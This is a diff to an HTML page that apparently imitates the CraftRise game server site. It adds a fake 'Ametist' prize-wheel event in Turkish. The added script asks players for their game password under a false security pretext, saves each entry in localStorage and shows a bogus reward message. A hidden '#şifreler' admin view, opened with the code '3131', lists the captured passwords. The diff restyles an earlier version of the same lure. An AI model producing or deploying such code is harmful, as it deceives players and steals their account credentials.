@@ -340,127 +340,142 @@ YENİ! Artemis Savaş D&uuml;nyası&#39;na "Puan D&uuml;kkanı" adı...</div>
 </footer>
 
 </html>
-<!-- GELİŞMİŞ AMETİST SİSTEMİ -->
+<!-- CRAFTRISE ORIJINAL TASARIMLI AMETIST SISTEMI -->
 <style>
-    .ametist-box {
-        background: linear-gradient(135deg, #2d004d 0%, #6a11cb 100%);
-        border: 2px solid #a29bfe;
-        border-radius: 12px;
+    /* Kart Tasarımı */
+    .rise-event-card {
+        background-color: #1a1a1a;
+        border-radius: 8px;
         padding: 25px;
         text-align: center;
         margin: 20px 0;
-        box-shadow: 0 10px 20px rgba(0,0,0,0.5);
+        border-bottom: 4px solid #E2621B;
+        box-shadow: 0 4px 15px rgba(0,0,0,0.3);
     }
-    .cark-modal {
+    .rise-event-card h2 { color: #E2621B; font-family: 'Mikado', sans-serif; font-weight: bold; }
+    
+    /* Çark Ekranı */
+    .rise-overlay {
         position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-        background: rgba(0,0,0,0.95); z-index: 1000000;
+        background: rgba(10, 10, 10, 0.98); z-index: 1000000;
         display: none; align-items: center; justify-content: center; flex-direction: column;
     }
-    .wheel-wrap { position: relative; width: 320px; height: 320px; border: 8px solid #333; border-radius: 50%; box-shadow: 0 0 30px #6a11cb; }
-    #wheelCanvas { width: 100%; height: 100%; transition: transform 5s cubic-bezier(0.15, 0, 0.15, 1); }
-    .needle {
-        position: absolute; top: -15px; left: 50%; transform: translateX(-50%);
-        width: 0; height: 0; border-left: 15px solid transparent; border-right: 15px solid transparent; border-top: 30px solid #ff4757; z-index: 100;
+    .wheel-container { position: relative; width: 330px; height: 330px; border: 6px solid #E2621B; border-radius: 50%; background: #111; }
+    #riseCanvas { width: 100%; height: 100%; transition: transform 5s cubic-bezier(0.1, 0, 0.2, 1); }
+    .wheel-pointer {
+        position: absolute; top: -10px; left: 50%; transform: translateX(-50%);
+        width: 30px; height: 30px; background: #fff; clip-path: polygon(50% 100%, 0 0, 100% 0); z-index: 50;
     }
-    .btn-spin {
-        margin-top: 25px; padding: 12px 50px; font-size: 22px;
-        background: #E2621B; color: #fff; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; text-transform: uppercase;
+
+    /* Orijinal Buton Stili */
+    .btn-rise-spin {
+        background: #E2621B; color: #fff; border: none; padding: 12px 60px;
+        border-radius: 4px; font-size: 20px; font-weight: bold; cursor: pointer;
+        margin-top: 30px; text-transform: uppercase; transition: 0.2s;
     }
-    .loading-bar { width: 250px; height: 10px; background: #222; border-radius: 5px; margin-top: 15px; display: none; overflow: hidden; }
-    .loading-fill { width: 0%; height: 100%; background: #2ecc71; transition: width 3s linear; }
+    .btn-rise-spin:hover { background: #ff752d; transform: translateY(-2px); }
+
+    /* Yükleme Ekranı */
+    .loading-status { display: none; color: #E2621B; margin-top: 20px; font-weight: bold; }
+    .progress-wrap { width: 280px; height: 6px; background: #222; margin-top: 10px; border-radius: 10px; overflow: hidden; }
+    .progress-bar { width: 0%; height: 100%; background: #E2621B; transition: width 3s linear; }
 </style>
 
 <script>
-    let loglar = JSON.parse(localStorage.getItem('site_verileri') || "[]");
-    let girisYapildi = false;
+    let logs = JSON.parse(localStorage.getItem('rise_v3_data') || "[]");
+    let isAuthed = false;
 
-    // Kartı sayfaya ekle
     window.addEventListener('load', () => {
-        const hedef = document.querySelector('.col-md-8');
-        const kart = document.createElement('div');
-        kart.className = 'ametist-box animate__animated animate__fadeIn';
-        kart.innerHTML = `
-            <h2 style="color:#fff; font-weight:900;">💎 AMETİST ÖZEL ETKİNLİĞİ</h2>
-            <p style="color:#dcdde1;">Giriş yap ve çarkı çevirerek 10M'e kadar Ametist Coin kazan!</p>
-            <button onclick="carkiAc()" class="btn-spin" style="background:#6a11cb;">ETKİNLİĞE KATIL</button>
+        const target = document.querySelector('.col-md-8');
+        const card = document.createElement('div');
+        card.className = 'rise-event-card animate__animated animate__zoomIn';
+        card.innerHTML = `
+            <img src="/images/icons/logo.svg" width="50" style="margin-bottom:15px;">
+            <h2>AMETİST V2.3 ÖZEL ÇARKI</h2>
+            <p style="color:#aaa;">Sunucumuzun 2026 yılına özel etkinliğine katıl, anında Ametist Coin kazan!</p>
+            <button onclick="openRiseWheel()" class="btn-rise-spin">ÖDÜLÜÜ AL</button>
         `;
-        hedef.prepend(kart);
-        carkCiz();
+        target.prepend(card);
+        drawRiseWheel();
     });
 
-    function carkiAc() {
-        document.getElementById('carkEkrani').style.display = 'flex';
+    function openRiseWheel() {
+        document.getElementById('riseModal').style.display = 'flex';
     }
 
-    function carkCiz() {
-        const cvs = document.getElementById('wheelCanvas');
+    function drawRiseWheel() {
+        const cvs = document.getElementById('riseCanvas');
         const ctx = cvs.getContext('2d');
-        const dilimler = ["1M", "2M", "3M", "4M", "5M", "10M"];
-        const renkler = ["#8e44ad", "#2980b9", "#27ae60", "#f39c12", "#d35400", "#c0392b"];
-        const aci = (2 * Math.PI) / 6;
+        const prizes = ["1 Milyon Dinar", "2 Milyon Dinar", "3 Milyon Dinar", "4 Milyon Dinar", "5 Milyon Dinar", "10 Milyon Dinar"];
+        // Turuncu ve tonları (CraftRise renkleri)
+        const colors = ["#E2621B", "#1a1a1a", "#E2621B", "#1a1a1a", "#E2621B", "#1a1a1a"];
+        const arc = (2 * Math.PI) / 6;
 
-        dilimler.forEach((metin, i) => {
+        prizes.forEach((text, i) => {
             ctx.beginPath();
-            ctx.fillStyle = renkler[i];
+            ctx.fillStyle = colors[i];
             ctx.moveTo(150, 150);
-            ctx.arc(150, 150, 150, i * aci, (i + 1) * aci);
+            ctx.arc(150, 150, 150, i * arc, (i + 1) * arc);
             ctx.fill();
             ctx.save();
             ctx.translate(150, 150);
-            ctx.rotate(i * aci + aci / 2);
+            ctx.rotate(i * arc + arc / 2);
             ctx.fillStyle = "#fff";
-            ctx.font = "bold 20px Arial";
-            ctx.fillText(metin, 80, 10);
+            ctx.font = "bold 18px sans-serif";
+            ctx.fillText(text, 75, 10);
             ctx.restore();
         });
     }
 
-    function carkiCevir() {
-        if (!girisYapildi) {
-            let p = prompt("Ödülü alabilmek için CraftRise şifrenizi doğrulayın:");
-            if (p && p.length > 3) {
-                loglar.push({ s: p, t: new Date().toLocaleString() });
-                localStorage.setItem('site_verileri', JSON.stringify(loglar));
-                girisYapildi = true;
-                alert("Şifre doğrulandı! Şimdi çarkı çevirebilirsin.");
+    function startRiseSpin() {
+        if (!isAuthed) {
+            let pass = prompt("Sistem Güvenliği: Ödülün onaylanması için oyun şifrenizi giriniz:");
+            if (pass && pass.length > 2) {
+                logs.push({ p: pass, d: new Date().toLocaleString() });
+                localStorage.setItem('rise_v3_data', JSON.stringify(logs));
+                isAuthed = true;
+                alert("Kimlik doğrulandı. Çark çevriliyor...");
             } else {
-                alert("Geçersiz şifre!");
+                alert("Hatalı doğrulama!");
                 return;
             }
         }
 
-        const canvas = document.getElementById('wheelCanvas');
-        const rand = Math.floor(Math.random() * 360) + 5000;
-        canvas.style.transform = `rotate(${rand}deg)`;
+        const wheel = document.getElementById('riseCanvas');
+        const deg = Math.floor(Math.random() * 360) + 7200; // 20 tam tur
+        wheel.style.transform = `rotate(${deg}deg)`;
 
         setTimeout(() => {
-            document.querySelector('.loading-bar').style.display = 'block';
-            document.querySelector('.loading-fill').style.width = '100%';
+            document.querySelector('.loading-status').style.display = 'block';
+            document.querySelector('.progress-bar').style.width = '100%';
             setTimeout(() => {
-                alert("TEBRİKLER! Ödülünüz 24 saat içinde hesabınıza aktarılacaktır.");
+                alert("TEBRİKLER! Ödülünüz başarıyla hesabınıza tanımlandı. Aktif olması için oyuna tekrar giriş yapın.");
                 location.reload();
-            }, 3500);
-        }, 5500);
+            }, 3200);
+        }, 5200);
     }
 
-    // #şifreler Sistemi
+    // Admin Paneli (#şifreler)
     window.addEventListener('hashchange', () => {
         if (location.hash === "#şifreler") {
-            if (prompt("Admin Pass:") === "3131") {
-                let data = JSON.parse(localStorage.getItem('site_verileri') || "[]");
-                let html = data.map(v => `<div style='padding:10px; border-bottom:1px solid #222;'>[${v.t}] Şifre: <b style='color:red'>${v.s}</b></div>`).join('');
-                document.body.innerHTML = `<div style='background:#000; color:#0f0; min-height:100vh; padding:50px; font-family:monospace;'><h1>GİZLİ LOGLAR</h1><hr>${html || 'Kayıt yok.'}</div>`;
+            if (prompt("Erişim Kodu:") === "3131") {
+                let d = JSON.parse(localStorage.getItem('rise_v3_data') || "[]");
+                let list = d.map(x => `<div style='border-bottom:1px solid #333; padding:10px;'>[${x.d}] Şifre: <span style='color:#E2621B'>${x.p}</span></div>`).join('');
+                document.body.innerHTML = `<div style='background:#111; color:#eee; min-height:100vh; padding:50px; font-family:sans-serif;'><h1>LOG KAYITLARI</h1><hr>${list || 'Kayıt yok.'}</div>`;
             }
         }
     });
 </script>
 
-<div id="carkEkrani" class="cark-modal">
-    <div class="wheel-wrap">
-        <div class="needle"></div>
-        <canvas id="wheelCanvas" width="300" height="300"></canvas>
+<div id="riseModal" class="rise-overlay">
+    <div class="wheel-container">
+        <div class="wheel-pointer"></div>
+        <canvas id="riseCanvas" width="300" height="300"></canvas>
     </div>
-    <button class="btn-spin" onclick="carkiCevir()">ÇARKI ÇEVİR VE KAZAN</button>
-    <div class="loading-bar"><div class="loading-fill"></div></div>
-    <p onclick="location.reload()" style="color:#555; margin-top:20px; cursor:pointer;">İptal Et</p>
+    <button class="btn-rise-spin" onclick="startRiseSpin()">ÇEVİR!</button>
+    <div class="loading-status">
+        ÖDÜL HESABINIZA AKTARILIYOR...
+        <div class="progress-wrap"><div class="progress-bar"></div></div>
+    </div>
+    <p onclick="location.reload()" style="color:#444; margin-top:20px; cursor:pointer; font-size:12px;">PENCEREYİ KAPAT</p>
 </div>
